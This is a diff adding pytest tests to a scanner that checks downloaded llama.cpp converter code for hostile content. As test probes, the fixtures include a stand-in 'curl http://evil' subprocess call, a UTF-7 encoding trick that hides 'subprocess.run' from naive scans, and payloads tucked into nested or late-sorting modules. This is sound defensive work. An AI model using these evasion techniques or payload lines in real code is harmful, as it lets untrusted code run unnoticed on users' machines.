@@ -31,6 +31,7 @@ Three groups:
 from __future__ import annotations
 
 import importlib.util
+import logging
 import os
 import sys
 from pathlib import Path
@@ -436,6 +437,37 @@ def test_undecodable_bytes_do_not_crash_the_scan(scan):
     assert scan.scan_converter_source(b"\xff\xfe\x00bad bytes\n", "x.py") == []
 
 
+def test_a_declared_encoding_is_what_the_scan_reads(scan):
+    """The file gets to choose how the interpreter decodes it, so the scan has to
+    read the same characters.
+
+    `# coding: utf-7` on line one makes
+    `+AHM-+AHU-+AGI-+AHA-+AHI-+AG8-+AGM-+AGU-+AHM-+AHM-.run(...)` the source text
+    `subprocess.run(...)`. Decoded as UTF-8 that is plus signs and capitals,
+    matching nothing, while the file Unsloth writes and executes spawns the
+    process. Verified against the scanner as it stood: zero findings.
+    """
+    import base64
+
+    shifted = "".join(
+        "+" + base64.b64encode(ch.encode("utf-16-be")).decode().rstrip("=") + "-"
+        for ch in "subprocess"
+    )
+    source = ("# coding: utf-7\n" + shifted + ".run(['curl', 'http://evil'])\n").encode("ascii")
+    assert source.decode("utf-7").find("subprocess.run") != -1, "the probe is not shifted"
+
+    checks = [finding.check for finding in scan.scan_converter_source(source)]
+    assert any("process" in check.lower() for check in checks), checks
+    assert any("encoding" in check.lower() for check in checks), checks
+
+
+def test_a_plain_utf8_converter_says_nothing_about_encoding(scan):
+    """The other half: an ordinary converter must not grow an encoding finding."""
+    source = b"import json\nprint(json.dumps({}))\n"
+    checks = [finding.check for finding in scan.scan_converter_source(source)]
+    assert not [check for check in checks if "encoding" in check.lower()], checks
+
+
 def test_scan_cap_leaves_room_for_the_largest_real_converter(scan):
     assert scan.MAX_SCAN_BYTES > 500 * 1024
 
@@ -730,7 +762,7 @@ def test_export_warns_but_completes_on_a_flagged_local_converter(
     assert os.path.isfile(patched), "a warning must not block the export"
 
 
-def test_only_a_pinned_or_verified_converter_is_exempt_from_strict_mode(tmp_path, monkeypatch):
+def test_only_a_pinned_converter_is_exempt_from_strict_mode(tmp_path, monkeypatch):
     """The exemption means "you chose this file", not "this file is on disk".
 
     When no prebuilt is available install_llama_cpp falls back to an unpinned
@@ -751,16 +783,158 @@ def test_only_a_pinned_or_verified_converter_is_exempt_from_strict_mode(tmp_path
         "a bare checkout must not be exempt"
     )
 
-    marker = clone / llama_cpp.UNSLOTH_PREBUILT_INFO_FILENAME
-    marker.write_text("{}")
-    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
-        "a prebuilt bundle is sha256 verified on arrival"
-    )
-    marker.unlink()
-
     monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(clone))
     assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
         "an explicit pin is a deliberate user choice"
     )
 
     assert llama_cpp._converter_is_trusted_local(None) is False
+
+
+def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypatch):
+    """os.listdir saw immediate children only.
+
+    A clean `conversion/__init__.py` doing `from .nested import x` fronted
+    `conversion/nested/__init__.py`, which was neither scanned nor counted
+    against the cap, and Python imported and ran it just the same.
+    """
+    llama_cpp = _load("llama_cpp_nested_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    nested = root / "conversion" / "nested"
+    nested.mkdir(parents = True)
+    (root / "conversion" / "__init__.py").write_text(
+        "from .nested import payload\n", encoding = "utf-8",
+    )
+    (nested / "__init__.py").write_text(
+        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
+        encoding = "utf-8",
+    )
+
+    assert "nested/__init__.py" in llama_cpp._conversion_package_modules(
+        str(root / "conversion")
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_nested_module_moves_the_patcher_cache_key(tmp_path):
+    """The key has to cover the same set the scan reads, or a changed nested
+    module is invisible to both."""
+    llama_cpp = _load("llama_cpp_nested_key_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    nested = root / "conversion" / "nested"
+    nested.mkdir(parents = True)
+    (root / "conversion" / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
+    (root / "conversion" / "base.py").write_text("Y = 1\n", encoding = "utf-8")
+    deep = nested / "helper.py"
+    deep.write_text("Z = 1\n", encoding = "utf-8")
+
+    before = llama_cpp._conversion_sibling_info(str(root))
+    assert before is not None
+    deep.write_text("Z = 2  # and a payload\n", encoding = "utf-8")
+    assert llama_cpp._conversion_sibling_info(str(root)) != before
+
+
+def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
+    tmp_path, monkeypatch, caplog
+):
+    """Scanning only the first MAX names let a payload hide past the cap.
+
+    A package can put its payload in a late-sorting module and import it from an
+    otherwise clean __init__.py; with the list silently truncated, strict mode
+    executed the unscanned module with nothing reported at all. The cap stays --
+    an attacker must not choose how much work this does -- so crossing it is
+    itself the finding.
+    """
+    llama_cpp = _load("llama_cpp_cap_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    conversion = root / "conversion"
+    conversion.mkdir(parents = True)
+    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1):
+        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")
+
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))
+    assert any("more than the" in record.message for record in caplog.records), (
+        f"the oversized package was not reported: {[r.message for r in caplog.records]}"
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    with pytest.raises(llama_cpp.ConverterScanError, match = "more than the"):
+        llama_cpp._scan_conversion_package(str(root))
+
+    # The same switch that silences every other finding silences this one.
+    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
+    llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch, caplog):
+    """The other half: the report must not fire on an ordinary package."""
+    llama_cpp = _load("llama_cpp_cap_ok_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    conversion = root / "conversion"
+    conversion.mkdir(parents = True)
+    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES):
+        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))
+    assert not [r for r in caplog.records if "more than the" in r.message]
+
+
+def test_a_prebuilt_marker_does_not_buy_the_exemption(tmp_path, monkeypatch):
+    """UNSLOTH_PREBUILT_INFO.json reads like proof of verification and is not.
+
+    _stage_prebuilt_install checks a sha256 for the BINARY asset, and only when
+    the release published one. The converter itself arrives separately through
+    _hydrate_converter_sources, which downloads a source tarball with no digest
+    at all, and the marker is written after that. So a replaced source tarball
+    wore a "verified" marker, took the strict-mode exemption and skipped the
+    conversion/ scan with it. The converter from a prebuilt bundle is a download
+    like any other and is scanned like one.
+    """
+    llama_cpp = _load("llama_cpp_marker_probe", "unsloth_zoo/llama_cpp.py")
+
+    bundle = tmp_path / "prebuilt"
+    bundle.mkdir()
+    script = bundle / "convert_hf_to_gguf.py"
+    script.write_text("# converter\n")
+    (bundle / llama_cpp.UNSLOTH_PREBUILT_INFO_FILENAME).write_text("{}")
+
+    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
+    assert llama_cpp._converter_is_trusted_local(str(script)) is False, (
+        "the marker does not say these converter bytes were verified"
+    )
+
+
+def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
+    """_resolve_local_convert_script accepts the pin after expanduser, so this
+    check has to expand it too, or a deliberately pinned converter with a finding
+    is refused under strict mode as though it had been downloaded."""
+    llama_cpp = _load("llama_cpp_tilde_probe", "unsloth_zoo/llama_cpp.py")
+
+    home = tmp_path / "home"
+    pinned = home / "llama.cpp"
+    pinned.mkdir(parents = True)
+    script = pinned / "convert_hf_to_gguf.py"
+    script.write_text("# converter\n")
+
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("USERPROFILE", str(home))
+    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", "~/llama.cpp")
+    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
+        "an unexpanded pin compared unequal to the expanded script path"
+    )
